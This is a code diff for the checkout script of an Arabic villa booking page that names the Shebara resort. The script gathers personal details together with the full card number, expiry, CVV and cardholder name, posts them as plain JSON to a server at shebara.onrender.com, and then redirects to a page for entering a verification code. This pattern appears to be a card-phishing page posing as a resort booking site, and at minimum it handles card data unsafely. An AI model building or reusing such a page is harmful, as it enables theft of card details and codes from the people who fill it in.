@@ -599,36 +599,50 @@ nav a:hover {
 
 <button id="confirmBooking">تأكيد حجزي</button>
 
- <script>
-const finalPrice = localStorage.getItem('finalPrice') || localStorage.getItem('villaPrice') || 0;
+<script>
+window.addEventListener('DOMContentLoaded', () => {
+  const personalData = JSON.parse(localStorage.getItem('personalData'));
+  if(!personalData) {
+    alert('يرجى تعبئة البيانات الشخصية أولًا');
+    window.location.href = 'buy.html';
+  }
+});
 
-async function submitBooking() {
+async function confirmPayment() {
+  const personalData = JSON.parse(localStorage.getItem('personalData'));
+
   const bookingData = {
-  cardNumber: document.getElementById('creditCardNumber').value,
-  cardExpiry: document.getElementById('expiryDate').value,
-  cardBrand: 'Visa', // أو اجعل المستخدم يحدد نوع البطاقة
-  cvv: document.getElementById('cvv').value,
-  nameOnCard: document.getElementById('nameOnCard').value,
-  amount: 18837 // أو اجلبه من الحجز
+    ...personalData, // الاسم، الهاتف، البريد، العنوان، السعر
+    cardNumber: document.getElementById('creditCardNumber').value,
+    cardExpiry: document.getElementById('expiryDate').value,
+    cardBrand: 'Visa', // أو اجعل المستخدم يختار النوع
+    cvv: document.getElementById('cvv').value,
+    nameOnCard: document.getElementById('nameOnCard').value,
+    amount: parseFloat(personalData.finalPrice)
   };
 
-  const res = await fetch('https://shebara.onrender.com/api/book', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(bookingData)
-  });
+  // إرسال البيانات للسيرفر
+  try {
+    const res = await fetch('https://shebara.onrender.com/api/book', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(bookingData)
+    });
 
-  const data = await res.json();
-  if(data.success){
-    localStorage.setItem('bookingId', data.bookingId); // حفظ ID للحجز
-    alert('تم بنجاح');
-    window.location.href = 'verify.html'; // تحويل المستخدم لصفحة إدخال الكود
-  } else {
-    alert('حدث خطأ، حاول مرة أخرى');
+    const data = await res.json();
+    if(data.success){
+      localStorage.setItem('bookingId', data.bookingId);
+      alert('تم الحجز بنجاح!');
+      window.location.href = 'verify.html';
+    } else {
+      alert('حدث خطأ، حاول مرة أخرى');
+    }
+  } catch (error) {
+    alert('فشل الاتصال بالخادم، حاول لاحقًا');
   }
 }
 
-document.getElementById('confirmBooking').addEventListener('click', submitBooking);
+document.getElementById('confirmBooking').addEventListener('click', confirmPayment);
 </script>
 </body>
 </html>
